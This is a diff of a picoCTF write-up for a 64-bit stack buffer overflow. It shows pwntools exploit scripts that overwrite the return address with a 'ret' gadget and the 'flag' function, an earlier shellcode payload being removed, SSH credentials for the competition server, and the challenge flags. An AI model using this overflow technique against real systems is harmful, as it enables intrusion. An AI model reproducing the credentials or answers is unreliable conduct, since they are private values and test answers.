@@ -94,9 +94,41 @@ else:
 binary = ELF('./vuln')
 
 print p.recvuntil('flag:')
-p.sendline('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII' + asm(shellcraft.amd64.linux.sh()))#p64(binary.symbols['flag'] * 20))
+p.sendline('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII' + p64(binary.symbols['flag']))
 
 print p.recvall()
 ```
 
-Flag: picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}
+This works locally but doesn't work on remote :(. Searching for this in the [Piazza](https://piazza.com/class/jzwrimxbxi46am?cid=399) says it has something with alignment in Ubuntu 18.04.
+We need to add a pointer to some ```ret``` command before the pointer to ```flag```.
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+
+debug = 0
+
+user = 'RoeeSefi'
+pw = 'UTTE9CQN2idX28W'
+
+if debug:
+  p = process('./vuln')
+else:
+  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
+  s.set_working_directory('/problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89')
+  p = s.process('./vuln')
+
+binary = ELF('./vuln')
+ret = binary.search(asm('ret')).next()
+
+print p.recvuntil('flag:')
+p.sendline('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII' + p64(ret) + p64(binary.symbols['flag']))
+
+print p.recvall()
+```
+
+I learned something new, nice!
+
+Flag: picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_bfd48203}
